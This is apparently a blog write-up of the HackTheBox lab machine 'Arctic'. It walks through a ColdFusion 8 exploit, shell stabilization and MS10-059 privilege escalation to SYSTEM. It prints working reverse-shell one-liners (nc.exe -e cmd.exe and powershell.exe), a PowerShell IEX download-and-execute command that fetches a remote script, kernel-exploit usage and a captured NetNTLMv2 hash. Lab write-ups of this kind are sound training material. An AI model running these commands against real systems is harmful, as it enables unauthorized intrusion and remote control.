---
title: HTB | Arctic
description: Arctic is an easy Windows machine that involves straightforward exploitation with some minor challenges. The process begins by troubleshooting the web server to identify the correct exploit. Initial access can be gained either through an unauthenticated file upload in Adobe ColdFusion. Once a shell is obtained, privilege escalation is achieved using the MS10-059 exploit.
slug: arctic-htb
date: 2025-03-08 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Windows
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Arctic cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Arctic</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Windows</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.11</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## System Infos
```bash
Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ??
System Boot Time:          9/3/2025, 4:20:09 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 4.964 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.080 MB
Virtual Memory: In Use:    1.205 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```

## Enumeration

### nmap

```bash
$ nmap -sC -sV -An -p- 10.10.10.11
HTTP -> Port 8500
```

## Foothold

### Adobe Coldfusion 8
On accède à une page de connexion pour les administrateurs du serveur :
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm

On note qu'il s'agit du service Adobe Coldfusion 8. On trouve directement un poc en python sur searchsploit et on obtient un shell sur la machine :
```bash
$ python3 exploit.py
...
Printing some information for debugging...
lhost: 10.10.14.10
lport: 1337
rhost: 10.10.10.11
rport: 8500
payload: 097d871e33a84bc8a3ed6002724b19ee.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 1337 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.11] 49235

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin> whoami
arctic\tolis
```

### Stabilize powershell

Dans un premier temps, il a fallu obtenir un meilleur cmd.exe car il n'était pas stable du tout. Impossible d'obtenir directement un powershell (stable ou non).
Ensuite, avec ce nouveau cmd.exe stable (grace a un serveur smbshare et un nc.exe), j'ai pu utiliser un nouveau revershell pour obtenir un powershell stable a l'aide du repo de nishang et de Invoke-TcpXXX.ps1.
```bash
┌──(kali㉿kali)-[~/htb/Arctic]
└─$ impacket-smbserver share .
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.11,49414)
[*] AUTHENTICATE_MESSAGE (ARCTIC\tolis,ARCTIC)
[*] User ARCTIC\tolis authenticated successfully
[*] tolis::ARCTIC:aaaaaaaaaaaaaaaa:c542f5a7a35d08fb97440dcae060b508:01010000000000000079e8fa958fdb0199d3a7cce7b544db00000000010010004a00550051007500770064006b004300030010004a00550051007500770064006b00430002001000500073005400480047006e005800440004001000500073005400480047006e0058004400070008000079e8fa958fdb01060004000200000008003000300000000000000000000000003000006d512dfe482ef201bb28a406e85c0fc4005f2cfd87b665b2061df41978469e2b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003000000000000000000000000000
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SHARE)

------------INITIAL FOOTHOLD CMD.EXE-------------

C:\ColdFusion8\runtime\bin>\\10.10.14.10\share\nc.exe -e cmd.exe 10.10.14.10 4444
\\10.10.14.10\share\nc.exe -e cmd.exe 10.10.14.10 4444

-----------NEW CMD.EXE ON PORT 4444-----------------
┌──(kali㉿kali)-[~/htb/Arctic]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.11] 49435
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>\\10.10.14.10\share\nc.exe -e powershell.exe 10.10.14.10 5555
\\10.10.14.10\share\nc.exe -e powershell.exe 10.10.14.10 5555

C:\ColdFusion8\runtime\bin>powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10:8888/shell.ps1')
powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10:8888/shell.ps1')


-----------POWERSHELL ON PORT 1338------------------
┌──(kali㉿kali)-[~/htb/Arctic]
└─$ nc -lnvp 1338    
listening on [any] 1338 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.11] 49451
Windows PowerShell running as user tolis on ARCTIC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\ColdFusion8\runtime\bin>whoami
arctic\tolis
```

## Privilege Escalation

### Kernel Exploit : Chimichurri.exe
Searching for elevation privilege CVE using "wes" windows-exploits-suggester.
```bash
┌──(kali㉿kali)-[~/htb/Arctic]
└─$ wes ./arctic_systeminfo | grep -I 'Elevation of Privilege' -B7 | grep CVE-2010-2554 -A7 -B2  

Date: 20100810
CVE: CVE-2010-2554
KB: KB982799
Title: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Important
Impact: Elevation of Privilege
--
```
On trouve un github avec un exe deja compilé pour faire l'exploit:
> https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe
```bash
PS C:\Users\tolis> .\Chimichurri.exe
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>
PS C:\Users\tolis> .\Chimichurri.exe 10.10.14.10 7676

---------------------
                                            
┌──(kali㉿kali)-[~/htb/Arctic]
└─$ nc -lnvp 7676
listening on [any] 7676 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.11] 50748
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis>whoami
whoami
nt authority\system

C:\Users\tolis>cd ../Administrator\Desktop
cd ../Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
8980.....ffb6
```